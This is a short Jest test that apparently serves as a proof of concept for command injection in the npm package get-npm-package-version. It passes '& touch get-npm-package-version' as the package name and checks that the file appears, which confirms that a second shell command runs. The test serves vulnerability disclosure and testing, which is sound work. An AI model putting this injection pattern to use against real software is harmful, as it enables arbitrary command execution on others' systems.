test("Command Injection in get-npm-package-version", () => {
  expect.assertions(2);
  const a = require("get-npm-package-version");
  const fs = require("fs");
  const path = "./get-npm-package-version";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a("& touch get-npm-package-version");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
